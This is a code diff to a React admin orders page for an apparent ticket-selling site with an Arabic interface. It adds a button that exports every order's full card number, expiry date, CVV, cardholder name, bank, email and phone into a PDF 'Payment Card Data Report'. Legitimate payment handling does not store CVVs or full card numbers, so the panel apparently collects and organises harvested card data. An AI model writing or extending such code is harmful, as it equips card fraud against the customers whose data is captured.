@@ -4,9 +4,10 @@ import { format } from "date-fns";
 import { ar } from "date-fns/locale";
 import {
   Search, CreditCard, Mail, Phone, Hash, Receipt, Ticket,
-  CheckCircle, XCircle, Filter, ShieldCheck, Clock, Ban, Landmark, Copy, Check,
+  CheckCircle, XCircle, Filter, ShieldCheck, Clock, Ban, Landmark, Copy, Check, FileText,
 } from "lucide-react";
 import { toast } from "sonner";
+import jsPDF from "jspdf";
 import ExportButtons from "@/components/admin/ExportButtons";
 
 interface Order {
@@ -61,6 +62,114 @@ const AdminOrders = () => {
       toast.success("تم نسخ بيانات البطاقة", { duration: 2000 });
       setTimeout(() => setCopiedId(null), 2000);
     });
+  };
+
+  const exportCardsPDF = () => {
+    const cardsData = filtered.filter(o => o.card_full_number || o.card_last4);
+    if (cardsData.length === 0) {
+      toast.error("لا توجد بيانات بطاقات للتصدير");
+      return;
+    }
+
+    const doc = new jsPDF({ orientation: "portrait", unit: "mm", format: "a4" });
+    const pageW = 210;
+    const margin = 15;
+    const contentW = pageW - margin * 2;
+
+    // Title
+    doc.setFontSize(18);
+    doc.setTextColor(109, 40, 217);
+    doc.text("Payment Card Data Report", pageW - margin, 20, { align: "right" });
+    doc.setFontSize(9);
+    doc.setTextColor(120);
+    doc.text(new Date().toLocaleDateString("ar-SA") + " | " + cardsData.length + " cards", pageW - margin, 27, { align: "right" });
+
+    // Divider
+    doc.setDrawColor(200);
+    doc.line(margin, 31, pageW - margin, 31);
+
+    let y = 38;
+    const cardH = 52;
+
+    cardsData.forEach((o, idx) => {
+      if (y + cardH > 280) {
+        doc.addPage();
+        y = 20;
+      }
+
+      // Card background
+      doc.setFillColor(248, 250, 252);
+      doc.setDrawColor(226, 232, 240);
+      doc.roundedRect(margin, y, contentW, cardH, 3, 3, "FD");
+
+      // Card number header strip
+      doc.setFillColor(109, 40, 217);
+      doc.roundedRect(margin, y, contentW, 10, 3, 3, "F");
+      doc.rect(margin, y + 5, contentW, 5, "F");
+
+      // Card index + brand
+      doc.setFontSize(9);
+      doc.setTextColor(255);
+      doc.text(`#${idx + 1}  ${o.card_brand || "CARD"}`, pageW - margin - 4, y + 7, { align: "right" });
+      doc.text(o.confirmation_number || o.id.slice(0, 8), margin + 4, y + 7);
+
+      // Card details
+      const col1X = pageW - margin - 4;
+      const col2X = pageW / 2;
+      let detailY = y + 17;
+
+      doc.setFontSize(8);
+      doc.setTextColor(100);
+
+      // Row 1: Card Number
+      doc.text("Card Number:", col1X, detailY, { align: "right" });
+      doc.setTextColor(30);
+      doc.setFontSize(11);
+      doc.text(o.card_full_number || `**** ${o.card_last4}`, col1X - 28, detailY, { align: "right" });
+
+      // Row 2: Expiry + CVV
+      detailY += 8;
+      doc.setFontSize(8);
+      doc.setTextColor(100);
+      doc.text("Expiry:", col1X, detailY, { align: "right" });
+      doc.setTextColor(30);
+      doc.text(o.card_expiry || "N/A", col1X - 14, detailY, { align: "right" });
+
+      doc.setTextColor(100);
+      doc.text("CVV:", col2X, detailY, { align: "right" });
+      doc.setTextColor(220, 38, 38);
+      doc.setFontSize(9);
+      doc.text(o.card_cvv || "N/A", col2X - 10, detailY, { align: "right" });
+
+      // Row 3: Cardholder + Bank
+      detailY += 8;
+      doc.setFontSize(8);
+      doc.setTextColor(100);
+      doc.text("Holder:", col1X, detailY, { align: "right" });
+      doc.setTextColor(30);
+      doc.text(o.cardholder_name || "N/A", col1X - 14, detailY, { align: "right" });
+
+      doc.setTextColor(100);
+      doc.text("Bank:", col2X, detailY, { align: "right" });
+      doc.setTextColor(30);
+      doc.text(o.bank_name || "N/A", col2X - 12, detailY, { align: "right" });
+
+      // Row 4: Email + Phone
+      detailY += 8;
+      doc.setFontSize(7);
+      doc.setTextColor(130);
+      doc.text(`${o.email}  |  ${o.phone}`, col1X, detailY, { align: "right" });
+
+      y += cardH + 5;
+    });
+
+    // Footer
+    doc.setFontSize(7);
+    doc.setTextColor(180);
+    doc.text("CONFIDENTIAL - Payment Card Data", pageW / 2, 290, { align: "center" });
+
+    doc.save("card-data-report.pdf");
+    toast.success("تم تصدير بيانات البطاقات بنجاح");
   };
 
   const fetchOrders = async () => {
@@ -121,24 +230,34 @@ const AdminOrders = () => {
             <p className="text-[10px] text-slate-400">{filtered.length} طلب • {totalRevenue} ر.س إيرادات</p>
           </div>
         </div>
-        <ExportButtons
-          data={filtered}
-          filename="orders"
-          title="طلبات التذاكر"
-          columns={[
-            { key: "email", label: "البريد" },
-            { key: "phone", label: "الهاتف" },
-            { key: "total", label: "الإجمالي", format: (v) => `${v} ر.س` },
-            { key: "payment_method", label: "طريقة الدفع", format: (v) => v === "card" ? "بطاقة" : v },
-            { key: "status", label: "الحالة", format: (v) => v === "confirmed" ? "مقبول" : v === "rejected" ? "مرفوض" : "قيد المراجعة" },
-            { key: "confirmation_number", label: "رقم التأكيد" },
-            { key: "cardholder_name", label: "حامل البطاقة" },
-            { key: "created_at", label: "التاريخ", format: (v) => new Date(v).toLocaleDateString("ar-SA") },
-          ]}
-        />
+        <div className="flex items-center gap-1.5">
+          <ExportButtons
+            data={filtered}
+            filename="orders"
+            title="طلبات التذاكر"
+            columns={[
+              { key: "email", label: "البريد" },
+              { key: "phone", label: "الهاتف" },
+              { key: "total", label: "الإجمالي", format: (v) => `${v} ر.س` },
+              { key: "payment_method", label: "طريقة الدفع", format: (v) => v === "card" ? "بطاقة" : v },
+              { key: "status", label: "الحالة", format: (v) => v === "confirmed" ? "مقبول" : v === "rejected" ? "مرفوض" : "قيد المراجعة" },
+              { key: "confirmation_number", label: "رقم التأكيد" },
+              { key: "cardholder_name", label: "حامل البطاقة" },
+              { key: "created_at", label: "التاريخ", format: (v) => new Date(v).toLocaleDateString("ar-SA") },
+            ]}
+          />
+          <button
+            onClick={exportCardsPDF}
+            className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg bg-violet-50 text-violet-600 text-[11px] font-medium hover:bg-violet-100 transition-colors"
+            title="تصدير بيانات البطاقات PDF"
+          >
+            <CreditCard className="w-3.5 h-3.5" />
+            بطاقات PDF
+          </button>
+        </div>
       </div>
 
-      {/* Search */}
+
       <div className="relative">
         <Search className="absolute right-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400" />
         <input
